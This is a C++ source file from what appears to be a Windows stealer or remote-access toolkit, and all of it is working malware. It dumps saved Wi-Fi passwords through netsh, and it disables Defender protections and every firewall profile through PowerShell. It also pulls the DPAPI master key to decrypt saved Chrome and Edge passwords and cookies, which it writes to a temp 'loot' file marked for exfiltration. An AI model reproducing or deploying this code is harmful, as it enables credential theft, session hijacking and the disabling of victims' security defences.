#include "arsenal.h"
#include "shell.h"
#include "utils.h"
#include "sqlite3.h"

#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <vector>
#include <fstream>
#include <Shlwapi.h> // For PathFileExists
#include <algorithm> // For std::remove

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Shlwapi.lib")

// ============================================================================
// 1. WiFi Stealer (Wrapping netsh)
// ============================================================================
std::string steal_wifi() {
    Shell shell;
    std::string profiles_out = shell.execute("netsh wlan show profiles");
    std::string result = "";
    
    // Quick and dirty line parsing
    size_t pos = 0;
    while ((pos = profiles_out.find("All User Profile", pos)) != std::string::npos) {
        size_t colon = profiles_out.find(':', pos);
        if (colon == std::string::npos) break;
        size_t endline = profiles_out.find('\n', colon);
        if (endline == std::string::npos) endline = profiles_out.length();
        
        std::string ssid = profiles_out.substr(colon + 1, endline - colon - 1);
        // trim
        ssid.erase(0, ssid.find_first_not_of(" \r"));
        ssid.erase(ssid.find_last_not_of(" \r") + 1);
        
        if (!ssid.empty()) {
            std::string detail = shell.execute("netsh wlan show profile name=\"" + ssid + "\" key=clear");
            size_t kpos = detail.find("Key Content");
            std::string pwd = "[OPEN/NO KEY]";
            if (kpos != std::string::npos) {
                size_t kcolon = detail.find(':', kpos);
                if (kcolon != std::string::npos) {
                    size_t kend = detail.find('\n', kcolon);
                    if (kend == std::string::npos) kend = detail.length();
                    pwd = detail.substr(kcolon + 1, kend - kcolon - 1);
                    pwd.erase(0, pwd.find_first_not_of(" \r"));
                    pwd.erase(pwd.find_last_not_of(" \r") + 1);
                }
            }
            result += "SSID: " + ssid + "  |  Password: " + pwd + "\n";
        }
        pos = endline;
    }
    
    return result.empty() ? "No WiFi profiles found." : result;
}

// ============================================================================
// 2. AV Killer (PowerShell Wrapper)
// ============================================================================
std::string av_kill() {
    std::vector<std::pair<std::string, std::string>> cmds = {
        {"Disable Defender Real-time", "Set-MpPreference -DisableRealtimeMonitoring $true"},
        {"Exclude C:\\ from scans", "Add-MpPreference -ExclusionPath 'C:\\'"},
        {"Disable Behavior Monitoring", "Set-MpPreference -DisableBehaviorMonitoring $true"},
        {"Disable IOAV Protection", "Set-MpPreference -DisableIOAVProtection $true"},
        {"Disable Script Scanning", "Set-MpPreference -DisableScriptScanning $true"},
        {"Disable Firewall (Domain)", "Set-NetFirewallProfile -Profile Domain -Enabled False"},
        {"Disable Firewall (Private)", "Set-NetFirewallProfile -Profile Private -Enabled False"},
        {"Disable Firewall (Public)", "Set-NetFirewallProfile -Profile Public -Enabled False"}
    };
    
    std::string result = "";
    Shell shell;
    
    for (auto& cmd : cmds) {
        std::string ps = "powershell.exe -NoProfile -Command \"" + cmd.second + "\"";
        std::string out = shell.execute(ps);
        
        // If there's any error text in the output, it usually means it was blocked.
        if (out.find("(no output)") != std::string::npos || out.empty()) {
            result += cmd.first + ": \xE2\x9C\x85 OK\n"; // Checkmark
        } else {
            std::string short_out = out.length() > 60 ? out.substr(0, 60) + "..." : out;
            // Trim newlines
            short_out.erase(std::remove(short_out.begin(), short_out.end(), '\n'), short_out.end());
            short_out.erase(std::remove(short_out.begin(), short_out.end(), '\r'), short_out.end());
            result += cmd.first + ": \xE2\x9D\x8C BLOCKED (" + short_out + ")\n"; // X mark
        }
    }
    return result;
}

// ============================================================================
// 3. Browser Data Stealer (DPAPI + AES-GCM)
// ============================================================================

// Base64 decoding (Windows built-in API)
static std::vector<BYTE> b64_decode(const std::string& b64) {
    DWORD outLen = 0;
    CryptStringToBinaryA(b64.c_str(), b64.length(), CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr);
    std::vector<BYTE> out(outLen);
    CryptStringToBinaryA(b64.c_str(), b64.length(), CRYPT_STRING_BASE64, out.data(), &outLen, nullptr, nullptr);
    return out;
}

// Extract AES Master Key from Local State using DPAPI
static std::vector<BYTE> get_master_key(const std::string& local_state_path) {
    std::ifstream file(local_state_path);
    if (!file) return {};
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Extremely basic JSON parse for encrypted_key
    std::string key = json_get(content, "encrypted_key");
    if (key.empty()) return {};
    
    std::vector<BYTE> enc_key = b64_decode(key);
    // Remove DPAPI prefix "DPAPI" (5 bytes)
    if (enc_key.size() < 5) return {};
    enc_key.erase(enc_key.begin(), enc_key.begin() + 5);
    
    // DPAPI Unprotect
    DATA_BLOB in, out;
    in.pbData = enc_key.data();
    in.cbData = (DWORD)enc_key.size();
    
    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
        std::vector<BYTE> master_key(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return master_key;
    }
    return {};
}

// AES-GCM decryption using BCrypt
static std::string aes_gcm_decrypt(const std::vector<BYTE>& master_key, const std::vector<BYTE>& iv, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::string plain = "";
    
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0) {
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)master_key.data(), master_key.size(), 0) == 0) {
                DWORD cbResult = 0;
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
                BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
                authInfo.pbNonce = (PUCHAR)iv.data();
                authInfo.cbNonce = iv.size();
                authInfo.pbTag = (PUCHAR)tag.data();
                authInfo.cbTag = tag.size();
                
                // Get size
                if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), ciphertext.size(), &authInfo, nullptr, 0, nullptr, 0, &cbResult, 0) == 0) {
                    std::vector<BYTE> buf(cbResult);
                    if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), ciphertext.size(), &authInfo, nullptr, 0, buf.data(), buf.size(), &cbResult, 0) == 0) {
                        plain = std::string((char*)buf.data(), cbResult);
                    }
                }
                BCryptDestroyKey(hKey);
            }
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return plain;
}

std::string steal_browser_data(const std::string& mode) {
    std::string final_out = "";
    
    std::string local_appdata = getenv("LOCALAPPDATA");
    
    struct Browser { std::string name; std::string path; };
    std::vector<Browser> browsers = {
        {"Chrome", local_appdata + "\\Google\\Chrome\\User Data"},
        {"Edge", local_appdata + "\\Microsoft\\Edge\\User Data"}
    };
    
    for (auto& b : browsers) {
        std::string ls_path = b.path + "\\Local State";
        if (!PathFileExistsA(ls_path.c_str())) continue;
        
        std::vector<BYTE> master_key = get_master_key(ls_path);
        if (master_key.empty()) {
            final_out += b.name + ": Failed to extract master key.\n";
            continue;
        }
        
        final_out += "\n=== " + b.name + " " + (mode == "passwords" ? "Passwords" : "Cookies") + " ===\n";
        
        std::vector<std::string> profiles = {"Default"};
        for (int i = 1; i <= 9; i++) profiles.push_back("Profile " + std::to_string(i));
        
        for (auto& p : profiles) {
            std::string db_name = (mode == "passwords") ? "Login Data" : "Cookies";
            std::string db_path = b.path + "\\" + p + "\\" + db_name;
            if (!PathFileExistsA(db_path.c_str())) continue;
            
            // Copy DB to temp folder because it might be locked by browser
            std::string tmp_db = std::string(getenv("TEMP")) + "\\tmp_" + b.name + "_" + p + "_" + db_name + ".db";
            CopyFileA(db_path.c_str(), tmp_db.c_str(), FALSE);
            
            sqlite3* db;
            if (sqlite3_open(tmp_db.c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                std::string q = (mode == "passwords") ? 
                    "SELECT origin_url, username_value, password_value FROM logins" :
                    "SELECT host_key, name, encrypted_value FROM cookies LIMIT 200";
                
                if (sqlite3_prepare_v2(db, q.c_str(), -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        
                        if (mode == "passwords") {
                            std::string url = (const char*)sqlite3_column_text(stmt, 0);
                            std::string user = (const char*)sqlite3_column_text(stmt, 1);
                            if (user.empty()) continue;
                            
                            int size = sqlite3_column_bytes(stmt, 2);
                            const void* blob = sqlite3_column_blob(stmt, 2);
                            if (size > 31) {
                                std::vector<BYTE> enc(size);
                                memcpy(enc.data(), blob, size);
                                
                                std::vector<BYTE> iv(enc.begin() + 3, enc.begin() + 15);
                                std::vector<BYTE> cipher(enc.begin() + 15, enc.end() - 16);
                                std::vector<BYTE> tag(enc.end() - 16, enc.end());
                                
                                std::string pwd = aes_gcm_decrypt(master_key, iv, cipher, tag);
                                if (!pwd.empty()) final_out += "URL: " + url + "\nUser: " + user + "\nPass: " + pwd + "\n\n";
                                else final_out += "URL: " + url + "\nUser: " + user + "\nPass: [DECRYPT FAILED]\n\n";
                            }
                        } else {
                            std::string host = (const char*)sqlite3_column_text(stmt, 0);
                            std::string name = (const char*)sqlite3_column_text(stmt, 1);
                            int size = sqlite3_column_bytes(stmt, 2);
                            const void* blob = sqlite3_column_blob(stmt, 2);
                            if (size > 31) {
                                std::vector<BYTE> enc(size);
                                memcpy(enc.data(), blob, size);
                                std::vector<BYTE> iv(enc.begin() + 3, enc.begin() + 15);
                                std::vector<BYTE> cipher(enc.begin() + 15, enc.end() - 16);
                                std::vector<BYTE> tag(enc.end() - 16, enc.end());
                                std::string val = aes_gcm_decrypt(master_key, iv, cipher, tag);
                                if (!val.empty()) {
                                    std::string short_val = val.length() > 80 ? val.substr(0,80) : val;
                                    final_out += host + " | " + name + " = " + short_val + "\n";
                                }
                            }
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            DeleteFileA(tmp_db.c_str());
        }
    }
    
    if (final_out.empty()) return "";
    
    // Dump to temp file for exfiltration
    std::string out_path = std::string(getenv("TEMP")) + "\\browser_loot_" + mode + ".txt";
    std::ofstream f(out_path);
    f << final_out;
    f.close();
    
    return out_path;
}
